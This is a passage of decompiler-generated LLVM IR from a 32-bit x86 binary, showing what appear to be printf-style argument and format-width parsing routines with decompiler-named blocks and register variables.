  br label %dec_label_pc_8050eb3

dec_label_pc_8050eb3:                             ; preds = %dec_label_pc_8050e99, %dec_label_pc_8050ea2
  %v1_8050f2817 = phi i32 [ %v1_8050ea8, %dec_label_pc_8050e99 ], [ %v1_8050f2817.pre, %dec_label_pc_8050ea2 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8050f2818 = add i32 %v1_8050f2817, 28
  %v3_8050f2819 = inttoptr i32 %v2_8050f2818 to i32*
  %v4_8050f2820 = load i32, i32* %v3_8050f2819, align 4
  %v5_8050f2b21 = icmp sgt i32 %v4_8050f2820, 0
  br i1 %v5_8050f2b21, label %dec_label_pc_8050eb7, label %dec_label_pc_8050f5d.loopexit

dec_label_pc_8050eb7:                             ; preds = %dec_label_pc_8050eb3, %dec_label_pc_8050f27
  %v1_8050f2823 = phi i32 [ %v1_8050f28, %dec_label_pc_8050f27 ], [ %v1_8050f2817, %dec_label_pc_8050eb3 ]
  %v1_8050eb722 = phi i32 [ %v1_8050f27, %dec_label_pc_8050f27 ], [ 0, %dec_label_pc_8050eb3 ]
  %v2_8050eb7 = mul i32 %v1_8050eb722, 4
  %v3_8050eb7 = add i32 %v2_8050eb7, 40
  %v4_8050eb7 = add i32 %v3_8050eb7, %v1_8050f2823
  %v5_8050eb7 = inttoptr i32 %v4_8050eb7 to i32*
  %v6_8050eb7 = load i32, i32* %v5_8050eb7, align 4
  store i32 %v6_8050eb7, i32* %eax.global-to-local, align 4
  %v1_8050ebb = add i32 %v6_8050eb7, -8
  %v9_8050ebb = icmp eq i32 %v1_8050ebb, 0
  br i1 %v9_8050ebb, label %dec_label_pc_8050f27, label %dec_label_pc_8050ec0

dec_label_pc_8050ec0:                             ; preds = %dec_label_pc_8050eb7
  %v10_8050ebb = icmp slt i32 %v1_8050ebb, 0
  %v6_8050ebb = sub i32 7, %v6_8050eb7
  %v7_8050ebb = and i32 %v6_8050ebb, %v6_8050eb7
  %v8_8050ebb = icmp slt i32 %v7_8050ebb, 0
  %v1_8050ec0 = add i32 %v1_8050f2823, 76
  %v2_8050ec0 = inttoptr i32 %v1_8050ec0 to i32*
  %v3_8050ec0 = load i32, i32* %v2_8050ec0, align 4
  store i32 %v3_8050ec0, i32* %edx.global-to-local, align 4
  %v3_8050ec3 = icmp eq i1 %v10_8050ebb, %v8_8050ebb
  br i1 %v3_8050ec3, label %dec_label_pc_8050ed3, label %dec_label_pc_8050ec5

dec_label_pc_8050ec5:                             ; preds = %dec_label_pc_8050ec0
  %tmp15 = icmp slt i32 %v6_8050eb7, 3
  %v9_8050ecc = icmp eq i32 %v6_8050eb7, 7
  %v1_8050ecf = icmp eq i1 %v9_8050ecc, false
  %or.cond = or i1 %tmp15, %v1_8050ecf
  br i1 %or.cond, label %dec_label_pc_8050f1a, label %dec_label_pc_8050efc

dec_label_pc_8050ed3:                             ; preds = %dec_label_pc_8050ec0
  %tmp16 = icmp sgt i32 %v6_8050eb7, 1024
  br i1 %tmp16, label %dec_label_pc_8050edc, label %dec_label_pc_8050f1a

dec_label_pc_8050edc:                             ; preds = %dec_label_pc_8050ed3
  %v6_8050edc = icmp eq i32 %v6_8050eb7, 2048
  br i1 %v6_8050edc, label %dec_label_pc_8050eec, label %dec_label_pc_8050ee3

dec_label_pc_8050ee3:                             ; preds = %dec_label_pc_8050edc
  %v9_8050ee3 = icmp eq i32 %v6_8050eb7, 2055
  %v1_8050ee8 = icmp eq i1 %v9_8050ee3, false
  br i1 %v1_8050ee8, label %dec_label_pc_8050f1a, label %dec_label_pc_8050f0b

dec_label_pc_8050eec:                             ; preds = %dec_label_pc_8050edc
  %v1_8050eec = add i32 %v3_8050ec0, 8
  store i32 %v1_8050eec, i32* %eax.global-to-local, align 4
  store i32 %v1_8050eec, i32* %v2_8050ec0, align 4
  %v0_8050ef2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ef2 = inttoptr i32 %v0_8050ef2 to i32*
  %v2_8050ef2 = load i32, i32* %v1_8050ef2, align 4
  store i32 %v2_8050ef2, i32* %eax.global-to-local, align 4
  %v1_8050ef4 = add i32 %v0_8050ef2, 4
  %v2_8050ef4 = inttoptr i32 %v1_8050ef4 to i32*
  %v3_8050ef4 = load i32, i32* %v2_8050ef4, align 4
  store i32 %v3_8050ef4, i32* %edx.global-to-local, align 4
  %v1_8050ef7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050ef7 = add i32 %v1_8050ef7, 4
  %v3_8050ef7 = inttoptr i32 %v2_8050ef7 to i32*
  store i32 %v3_8050ef4, i32* %v3_8050ef7, align 4
  %v0_8050f22.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f22

dec_label_pc_8050efc:                             ; preds = %dec_label_pc_8050ec5
  %v3_8050efc = load i32, i32* %v2_8050ec0, align 4
  store i32 %v3_8050efc, i32* %edx.global-to-local, align 4
  %v1_8050eff = add i32 %v3_8050efc, 8
  store i32 %v1_8050eff, i32* %eax.global-to-local, align 4
  store i32 %v1_8050eff, i32* %v2_8050ec0, align 4
  %v0_8050f05 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f05 = inttoptr i32 %v0_8050f05 to double*
  %v2_8050f05 = load double, double* %v1_8050f05, align 4
  %v2_8050f07 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8050f07 = inttoptr i32 %v2_8050f07 to double*
  store double %v2_8050f05, double* %v4_8050f07, align 4
  br label %dec_label_pc_8050f24

dec_label_pc_8050f0b:                             ; preds = %dec_label_pc_8050ee3
  %v3_8050f0b = load i32, i32* %v2_8050ec0, align 4
  store i32 %v3_8050f0b, i32* %edx.global-to-local, align 4
  %v1_8050f0e = add i32 %v3_8050f0b, 12
  store i32 %v1_8050f0e, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f0e, i32* %v2_8050ec0, align 4
  %v0_8050f14 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f14 = inttoptr i32 %v0_8050f14 to x86_fp80*
  %v2_8050f14 = load x86_fp80, x86_fp80* %v1_8050f14, align 4
  %v2_8050f16 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8050f16 = inttoptr i32 %v2_8050f16 to x86_fp80*
  store x86_fp80 %v2_8050f14, x86_fp80* %v3_8050f16, align 4
  br label %dec_label_pc_8050f24

dec_label_pc_8050f1a:                             ; preds = %dec_label_pc_8050ec5, %dec_label_pc_8050ed3, %dec_label_pc_8050ee3
  %v1_8050f1a = add i32 %v3_8050ec0, 4
  store i32 %v1_8050f1a, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f1a, i32* %v2_8050ec0, align 4
  %v0_8050f20 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f20 = inttoptr i32 %v0_8050f20 to i32*
  %v2_8050f20 = load i32, i32* %v1_8050f20, align 4
  store i32 %v2_8050f20, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f22

dec_label_pc_8050f22:                             ; preds = %dec_label_pc_8050eec, %dec_label_pc_8050f1a
  %v0_8050f22 = phi i32 [ %v0_8050f22.pre, %dec_label_pc_8050eec ], [ %v2_8050f20, %dec_label_pc_8050f1a ]
  %v1_8050f22 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050f22 = inttoptr i32 %v1_8050f22 to i32*
  store i32 %v0_8050f22, i32* %v2_8050f22, align 4
  %v0_8050f24.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050f24

dec_label_pc_8050f24:                             ; preds = %dec_label_pc_8050f0b, %dec_label_pc_8050efc, %dec_label_pc_8050f22
  %v0_8050f24 = phi i32 [ %v2_8050f16, %dec_label_pc_8050f0b ], [ %v2_8050f07, %dec_label_pc_8050efc ], [ %v0_8050f24.pre, %dec_label_pc_8050f22 ]
  %v1_8050f24 = add i32 %v0_8050f24, 12
  store i32 %v1_8050f24, i32* %ebx.global-to-local, align 4
  %v0_8050f27.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8050f28.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050f27

dec_label_pc_8050f27:                             ; preds = %dec_label_pc_8050eb7, %dec_label_pc_8050f24
  %v1_8050f28 = phi i32 [ %v1_8050f2823, %dec_label_pc_8050eb7 ], [ %v1_8050f28.pre, %dec_label_pc_8050f24 ]
  %v0_8050f27 = phi i32 [ %v1_8050eb722, %dec_label_pc_8050eb7 ], [ %v0_8050f27.pre, %dec_label_pc_8050f24 ]
  %v1_8050f27 = add i32 %v0_8050f27, 1
  store i32 %v1_8050f27, i32* %esi.global-to-local, align 4
  %v2_8050f28 = add i32 %v1_8050f28, 28
  %v3_8050f28 = inttoptr i32 %v2_8050f28 to i32*
  %v4_8050f28 = load i32, i32* %v3_8050f28, align 4
  %v5_8050f2b = icmp slt i32 %v1_8050f27, %v4_8050f28
  br i1 %v5_8050f2b, label %dec_label_pc_8050eb7, label %dec_label_pc_8050f5d.loopexit

dec_label_pc_8050f2f:                             ; preds = %dec_label_pc_8050e6c
  br i1 %v1_8050f36, label %dec_label_pc_8050f46, label %dec_label_pc_8050f38

dec_label_pc_8050f38:                             ; preds = %dec_label_pc_8050f2f
  %v1_8050f38 = add i32 %arg1, 36
  %v2_8050f38 = inttoptr i32 %v1_8050f38 to i8*
  %v3_8050f38 = load i8, i8* %v2_8050f38, align 1
  %v2_8050f3c = zext i8 %v3_8050f38 to i32
  %v3_8050f3c = mul nuw nsw i32 %v2_8050f3c, 12
  store i32 %v3_8050f3c, i32* %eax.global-to-local, align 4
  %v2_8050f3f = add i32 %arg1, 68
  %v3_8050f3f = add i32 %v2_8050f3f, %v3_8050f3c
  %v4_8050f3f = inttoptr i32 %v3_8050f3f to i32*
  %v5_8050f3f = load i32, i32* %v4_8050f3f, align 4
  store i32 %v5_8050f3f, i32* %eax.global-to-local, align 4
  store i32 %v5_8050f3f, i32* %v2_8050f2f, align 4
  %v0_8050f46.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050f46

dec_label_pc_8050f46:                             ; preds = %dec_label_pc_8050f2f, %dec_label_pc_8050f38
  %v1_8050f5a = phi i32 [ %arg1, %dec_label_pc_8050f2f ], [ %v0_8050f46.pre, %dec_label_pc_8050f38 ]
  %v1_8050f46 = add i32 %v1_8050f5a, 4
  %v2_8050f46 = inttoptr i32 %v1_8050f46 to i32*
  %v3_8050f46 = load i32, i32* %v2_8050f46, align 4
  %v8_8050f46 = icmp eq i32 %v3_8050f46, -2147483648
  %v1_8050f4d = icmp eq i1 %v8_8050f46, false
  br i1 %v1_8050f4d, label %dec_label_pc_8050f5d, label %dec_label_pc_8050f4f

dec_label_pc_8050f4f:                             ; preds = %dec_label_pc_8050f46
  %v1_8050f4f = add i32 %v1_8050f5a, 37
  %v2_8050f4f = inttoptr i32 %v1_8050f4f to i8*
  %v3_8050f4f = load i8, i8* %v2_8050f4f, align 1
  %v2_8050f53 = zext i8 %v3_8050f4f to i32
  %v3_8050f53 = mul nuw nsw i32 %v2_8050f53, 12
  store i32 %v3_8050f53, i32* %eax.global-to-local, align 4
  %v1_8050f56 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050f56 = add nsw i32 %v3_8050f53, -12
  %v3_8050f56 = add i32 %v2_8050f56, %v1_8050f56
  %v4_8050f56 = inttoptr i32 %v3_8050f56 to i32*
  %v5_8050f56 = load i32, i32* %v4_8050f56, align 4
  store i32 %v5_8050f56, i32* %eax.global-to-local, align 4
  store i32 %v5_8050f56, i32* %v2_8050f46, align 4
  %v0_8050f5d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050f5d

dec_label_pc_8050f5d.loopexit:                    ; preds = %dec_label_pc_8050f27, %dec_label_pc_8050eb3
  %v1_8050f28.lcssa = phi i32 [ %v1_8050f2817, %dec_label_pc_8050eb3 ], [ %v1_8050f28, %dec_label_pc_8050f27 ]
  br label %dec_label_pc_8050f5d

dec_label_pc_8050f5d:                             ; preds = %dec_label_pc_8050f5d.loopexit, %dec_label_pc_8050f46, %dec_label_pc_8050f4f
  %v10_8050f64 = phi i32 [ %v1_8050f28.lcssa, %dec_label_pc_8050f5d.loopexit ], [ %v1_8050f5a, %dec_label_pc_8050f46 ], [ %v0_8050f5d.pre, %dec_label_pc_8050f4f ]
  %v1_8050f5d = add i32 %v10_8050f64, 8
  %v2_8050f5d = inttoptr i32 %v1_8050f5d to i32*
  %v3_8050f5d = load i32, i32* %v2_8050f5d, align 4
  store i32 %v3_8050f5d, i32* %eax.global-to-local, align 4
  %v2_8050f60 = icmp slt i32 %v3_8050f5d, 0
  %v1_8050f62 = icmp eq i1 %v2_8050f60, false
  br i1 %v1_8050f62, label %dec_label_pc_8050f78, label %dec_label_pc_8050f64

dec_label_pc_8050f64:                             ; preds = %dec_label_pc_8050f5d
  %v1_8050f64 = add i32 %v10_8050f64, 16
  %v2_8050f64 = inttoptr i32 %v1_8050f64 to i32*
  %v3_8050f64 = load i32, i32* %v2_8050f64, align 4
  %v4_8050f64 = or i32 %v3_8050f64, 8
  store i32 %v4_8050f64, i32* %v2_8050f64, align 4
  %v0_8050f68 = load i32, i32* @ecx, align 4
  %v1_8050f68 = add i32 %v0_8050f68, 16
  %v2_8050f68 = inttoptr i32 %v1_8050f68 to i32*
  %v3_8050f68 = load i32, i32* %v2_8050f68, align 4
  %v4_8050f68 = and i32 %v3_8050f68, -2
  store i32 %v4_8050f68, i32* %v2_8050f68, align 4
  %v0_8050f6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f6c = sub i32 0, %v0_8050f6c
  store i32 %v1_8050f6c, i32* %eax.global-to-local, align 4
  %v1_8050f6e = load i32, i32* @ecx, align 4
  %v2_8050f6e = add i32 %v1_8050f6e, 8
  %v3_8050f6e = inttoptr i32 %v2_8050f6e to i32*
  store i32 %v1_8050f6c, i32* %v3_8050f6e, align 4
  %v0_8050f71 = load i32, i32* @ecx, align 4
  %v1_8050f71 = add i32 %v0_8050f71, 20
  %v2_8050f71 = inttoptr i32 %v1_8050f71 to i32*
  store i32 32, i32* %v2_8050f71, align 4
  %v0_8050f7a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f78

dec_label_pc_8050f78:                             ; preds = %dec_label_pc_8050f5d, %dec_label_pc_8050f64
  %v0_8050f7a = phi i32 [ %v3_8050f5d, %dec_label_pc_8050f5d ], [ %v0_8050f7a.pre, %dec_label_pc_8050f64 ]
  %v2_8050f78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050f78, i32* @ebx, align 4
  ret i32 %v0_8050f7a

; uselistorder directives
  uselistorder i32 %v3_8050f53, { 1, 0 }
  uselistorder i32 %v1_8050f27, { 2, 1, 0 }
  uselistorder i32 %v1_8050f28, { 0, 2, 1 }
  uselistorder i32 %v3_8050ec0, { 1, 0, 2 }
  uselistorder i32* %v2_8050ec0, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8050ebb, { 1, 0 }
  uselistorder i32 %v6_8050eb7, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_8050eb722, { 1, 0 }
  uselistorder i1 %v1_8050f36, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_8050f78, { 1, 0 }
  uselistorder label %dec_label_pc_8050f5d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050f46, { 1, 0 }
  uselistorder label %dec_label_pc_8050f27, { 1, 0 }
  uselistorder label %dec_label_pc_8050f24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050f22, { 1, 0 }
  uselistorder label %dec_label_pc_8050f1a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050eb7, { 1, 0 }
  uselistorder label %dec_label_pc_8050eb3, { 1, 0 }
  uselistorder label %dec_label_pc_8050e99, { 1, 0 }
}

define i32 @function_8050f7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050f7c:
  %v0_8050f7c = load i32, i32* @eax, align 4
  br label %dec_label_pc_8050f83

dec_label_pc_8050f83:                             ; preds = %dec_label_pc_8050f83, %dec_label_pc_8050f7c
  %v0_8050f83 = phi i32 [ ptrtoint (i8** @global_var_805b66a.313 to i32), %dec_label_pc_8050f7c ], [ %v1_8050f83, %dec_label_pc_8050f83 ]
  %v1_8050f83 = add i32 %v0_8050f83, -2
  %v1_8050f86 = inttoptr i32 %v1_8050f83 to i16*
  %v2_8050f86 = load i16, i16* %v1_8050f86, align 2
  %v3_8050f86 = sext i16 %v2_8050f86 to i32
  %v12_8050f89 = icmp ne i32 %v3_8050f86, %v0_8050f7c
  %v6_8050f93 = icmp ugt i32 %v1_8050f83, ptrtoint (i32* @global_var_805b652.314 to i32)
  %or.cond = and i1 %v6_8050f93, %v12_8050f89
  br i1 %or.cond, label %dec_label_pc_8050f83, label %dec_label_pc_8050f95

dec_label_pc_8050f95:                             ; preds = %dec_label_pc_8050f83
  %.pre = add i32 %v0_8050f83, -134592084
  %v2_8050f9b = sdiv i32 %.pre, 2
  store i32 %v2_8050f9b, i32* @edx, align 4
  %v1_8050f9d = add i32 %v2_8050f9b, ptrtoint (i8** @global_var_805b66a.313 to i32)
  %v2_8050f9d = inttoptr i32 %v1_8050f9d to i8*
  %v3_8050f9d = load i8, i8* %v2_8050f9d, align 1
  %v4_8050f9d = zext i8 %v3_8050f9d to i32
  ret i32 %v4_8050f9d

; uselistorder directives
  uselistorder i32 %v2_8050f9b, { 1, 0 }
  uselistorder i32 %v1_8050f83, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805b66a.313 to i32), { 1, 0 }
}

define i32 @function_8050fa5(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050fa5:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050fa6 = load i32, i32* @edi, align 4
  %v0_8050fa7 = load i32, i32* @esi, align 4
  %v0_8050fa8 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fa8, i32* %stack_var_-16, align 4
  %v4_8050fa8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8050fd4 = add i32 %tmp76, 24
  %v2_8050fd4 = inttoptr i32 %v1_8050fd4 to i32*
  %v3_8050fd4 = load i32, i32* %v2_8050fd4, align 4
  store i32 %v3_8050fd4, i32* %eax.global-to-local, align 4
  %v1_8050fdb = add i32 %tmp76, 16
  %v2_8050fdb = inttoptr i32 %v1_8050fdb to i32*
  %v3_8050fdb = load i32, i32* %v2_8050fdb, align 4
  %v1_8050fde = and i32 %v3_8050fdb, 128
  %v2_8050fde = icmp eq i32 %v1_8050fde, 0
  store i32 %v1_8050fde, i32* %edi.global-to-local, align 4
  %v1_8050fe4 = icmp eq i1 %v2_8050fde, false
  br i1 %v1_8050fe4, label %dec_label_pc_8050ff7, label %dec_label_pc_8050fe6

dec_label_pc_8050fe6:                             ; preds = %dec_label_pc_8050fa5
  %v2_8050fe6 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051044.outer

dec_label_pc_8050ff1:                             ; preds = %dec_label_pc_805117f
  %v1_8050ff1 = add i32 %v0_805117f.pre.pre, 1
  store i32 %v1_8050ff1, i32* @esi, align 4
  br label %dec_label_pc_805118f

dec_label_pc_8050ff7:                             ; preds = %dec_label_pc_8050fa5
  %v15_8050fa9 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050ff9

dec_label_pc_8050ff9:                             ; preds = %dec_label_pc_8051021.dec_label_pc_8050ff9_crit_edge, %dec_label_pc_8050ff7
  %v2_805100a = phi i32 [ %v2_805100a.pre, %dec_label_pc_8051021.dec_label_pc_8050ff9_crit_edge ], [ %v15_8050fa9, %dec_label_pc_8050ff7 ]
  %v3_805100a = phi i32 [ %v1_8051021, %dec_label_pc_8051021.dec_label_pc_8050ff9_crit_edge ], [ 0, %dec_label_pc_8050ff7 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8050ffd = mul i32 %v3_805100a, 4
  store i32 %v1_8050ffd, i32* @ecx, align 4
  %v2_8051004 = load i32, i32* %arg1, align 4
  store i32 %v2_8051004, i32* @edx, align 4
  %v2_8051006 = add i32 %v1_8050ffd, -4
  %v3_8051006 = add i32 %v2_8051006, %v2_8051004
  %v4_8051006 = inttoptr i32 %v3_8051006 to i32*
  %v5_8051006 = load i32, i32* %v4_8051006, align 4
  store i32 %v5_8051006, i32* %eax.global-to-local, align 4
  %v1_805100a = trunc i32 %v5_8051006 to i8
  %v4_805100a = add i32 %v2_805100a, 36
  %v5_805100a = add i32 %v4_805100a, %v3_805100a
  %v6_805100a = inttoptr i32 %v5_805100a to i8*
  store i8 %v1_805100a, i8* %v6_805100a, align 1
  %v0_805100e = load i32, i32* %eax.global-to-local, align 4
  %v1_805100e = urem i32 %v0_805100e, 256
  %v2_805100e = load i32, i32* @ebx, align 4
  %v3_805100e = and i32 %v2_805100e, -256
  %v4_805100e = or i32 %v3_805100e, %v1_805100e
  store i32 %v4_805100e, i32* @ebx, align 4
  %v1_8051010 = mul i32 %v0_805100e, 16777216
  %v2_8051010 = sdiv i32 %v1_8051010, 16777216
  store i32 %v2_8051010, i32* %eax.global-to-local, align 4
  %v1_8051013 = load i32, i32* @edx, align 4
  %v2_8051013 = load i32, i32* @ecx, align 4
  %v3_8051013 = add i32 %v1_8051013, -4
  %v4_8051013 = add i32 %v3_8051013, %v2_8051013
  %v5_8051013 = inttoptr i32 %v4_8051013 to i32*
  %v6_8051013 = load i32, i32* %v5_8051013, align 4
  %v17_8051013 = icmp eq i32 %v2_8051010, %v6_8051013
  %v1_8051017 = icmp eq i1 %v17_8051013, false
  br i1 %v1_8051017, label %dec_label_pc_8051363, label %dec_label_pc_805101d

dec_label_pc_805101d:                             ; preds = %dec_label_pc_8050ff9
  %v3_805101d = trunc i32 %v0_805100e to i8
  %v4_805101d = icmp eq i8 %v3_805101d, 0
  br i1 %v4_805101d, label %dec_label_pc_8051027, label %dec_label_pc_8051021

dec_label_pc_8051021:                             ; preds = %dec_label_pc_805101d
  %v0_8051021 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051021 = add i32 %v0_8051021, 1
  store i32 %v1_8051021, i32* %esi.global-to-local, align 4
  %tmp184 = icmp ult i32 %v1_8051021, 32
  br i1 %tmp184, label %dec_label_pc_8051021.dec_label_pc_8050ff9_crit_edge, label %dec_label_pc_8051027

dec_label_pc_8051021.dec_label_pc_8050ff9_crit_edge: ; preds = %dec_label_pc_8051021
  %v2_805100a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050ff9

dec_label_pc_8051027:                             ; preds = %dec_label_pc_8051021, %dec_label_pc_805101d
  %v2_805102c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8051044.outer

dec_label_pc_8051044.outer:                       ; preds = %dec_label_pc_8051027, %dec_label_pc_8050fe6, %dec_label_pc_8051161
  %v0_8051050.ph94 = phi i32 [ %v1_8051161, %dec_label_pc_8051161 ], [ %v2_8050fe6, %dec_label_pc_8050fe6 ], [ %v2_805102c, %dec_label_pc_8051027 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8051161 ], [ %tmp66, %dec_label_pc_8050fe6 ], [ %tmp66, %dec_label_pc_8051027 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8050fea, %dec_label_pc_8051161 ], [ 0, %dec_label_pc_8050fe6 ], [ 0, %dec_label_pc_8051027 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051161 ], [ %v3_8050fd4, %dec_label_pc_8050fe6 ], [ %v3_8050fd4, %dec_label_pc_8051027 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8051161 ], [ 0, %dec_label_pc_8050fe6 ], [ 0, %dec_label_pc_8051027 ]
  %v7_805104b = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805104b = trunc i64 %v7_805104b to i32
  %v2_8051053 = add i32 %v8_805104b, 80
  br label %dec_label_pc_8051044

dec_label_pc_8051044:                             ; preds = %dec_label_pc_8051044.outer, %dec_label_pc_8051101
  %v0_8051050 = phi i32 [ %v0_805110e, %dec_label_pc_8051101 ], [ %v0_8051050.ph94, %dec_label_pc_8051044.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8051101 ], [ %stack_var_-32.1.ph, %dec_label_pc_8051044.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8051101 ], [ %stack_var_-88.1.ph, %dec_label_pc_8051044.outer ]
  store i32 %v0_8051050, i32* @edx, align 4
  store i32 %v0_8051050, i32* @esi, align 4
  %v1_8051046 = inttoptr i32 %v0_8051050 to i8*
  %v2_8051046 = load i8, i8* %v1_8051046, align 1
  %v11_8051046 = icmp eq i8 %v2_8051046, 42
  %v1_8051049 = icmp eq i1 %v11_8051046, false
  br i1 %v1_8051049, label %dec_label_pc_805105b, label %dec_label_pc_805104b

dec_label_pc_805104b:                             ; preds = %dec_label_pc_8051044
  store i32 %v8_805104b, i32* %eax.global-to-local, align 4
  %v1_8051050 = add i32 %v0_8051050, 1
  store i32 %v1_8051050, i32* @esi, align 4
  %v0_8051053 = load i32, i32* @esp, align 4
  %v3_8051053 = add i32 %v2_8051053, %v0_8051053
  %v4_8051053 = inttoptr i32 %v3_8051053 to i32*
  store i32 0, i32* %v4_8051053, align 4
  %v0_8051075.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805105b

dec_label_pc_805105b:                             ; preds = %dec_label_pc_8051044, %dec_label_pc_805104b
  %v0_8051075.pre = phi i32 [ %v0_8051050, %dec_label_pc_8051044 ], [ %v0_8051075.pre.pre, %dec_label_pc_805104b ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_805105d = load i32, i32* @global_var_805d61c, align 4
  store i32 %v0_805105d, i32* %ebp.global-to-local, align 4
  %v4_8051075.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051075124 = inttoptr i32 %v0_8051075.pre to i8*
  %v2_8051075125 = load i8, i8* %v1_8051075124, align 1
  %v3_8051075126 = zext i8 %v2_8051075125 to i32
  %v5_8051075127 = and i32 %v4_8051075.pre, -256
  %v6_8051075128 = or i32 %v3_8051075126, %v5_8051075127
  store i32 %v6_8051075128, i32* %eax.global-to-local, align 4
  %v2_8051077129 = sext i8 %v2_8051075125 to i32
  store i32 %v2_8051077129, i32* @ecx, align 4
  %v2_805107a130 = mul nsw i32 %v2_8051077129, 2
  %v3_805107a131 = add i32 %v2_805107a130, %v0_805105d
  %v4_805107a132 = inttoptr i32 %v3_805107a131 to i8*
  %v5_805107a133 = load i8, i8* %v4_805107a132, align 1
  %v6_805107a134 = and i8 %v5_805107a133, 8
  %v7_805107a135 = icmp eq i8 %v6_805107a134, 0
  %v1_805107f136 = icmp eq i1 %v7_805107a135, false
  br i1 %v1_805107f136, label %dec_label_pc_8051065, label %dec_label_pc_8051081

dec_label_pc_8051065:                             ; preds = %dec_label_pc_805105b, %dec_label_pc_8051074
  %v2_8051077140 = phi i32 [ %v2_8051077, %dec_label_pc_8051074 ], [ %v2_8051077129, %dec_label_pc_805105b ]
  %v6_8051075139 = phi i32 [ %v6_8051075, %dec_label_pc_8051074 ], [ %v6_8051075128, %dec_label_pc_805105b ]
  %v0_8051074138 = phi i32 [ %v1_8051074, %dec_label_pc_8051074 ], [ %v0_8051075.pre, %dec_label_pc_805105b ]
  %v1_805106d137 = phi i32 [ %v0_805108f32, %dec_label_pc_8051074 ], [ 0, %dec_label_pc_805105b ]
  %v1_8051065 = add i32 %v1_805106d137, -4094
  %v6_8051065 = sub i32 4093, %v1_805106d137
  %v7_8051065 = and i32 %v6_8051065, %v1_805106d137
  %v8_8051065 = icmp slt i32 %v7_8051065, 0
  %v9_8051065 = icmp eq i32 %v1_8051065, 0
  %v10_8051065 = icmp slt i32 %v1_8051065, 0
  %v3_805106b = icmp eq i1 %v10_8051065, %v8_8051065
  %v4_805106b = icmp eq i1 %v9_8051065, false
  %v5_805106b = and i1 %v4_805106b, %v3_805106b
  br i1 %v5_805106b, label %dec_label_pc_8051074, label %dec_label_pc_805106d

dec_label_pc_805106d:                             ; preds = %dec_label_pc_8051065
  %v3_805106d = mul i32 %v1_805106d137, 10
  store i32 %v3_805106d, i32* %eax.global-to-local, align 4
  %v2_8051070 = add i32 %v3_805106d, -48
  %v3_8051070 = add i32 %v2_8051070, %v2_8051077140
  store i32 %v3_8051070, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051074

dec_label_pc_8051074:                             ; preds = %dec_label_pc_8051065, %dec_label_pc_805106d
  %v0_805108f32 = phi i32 [ %v1_805106d137, %dec_label_pc_8051065 ], [ %v3_8051070, %dec_label_pc_805106d ]
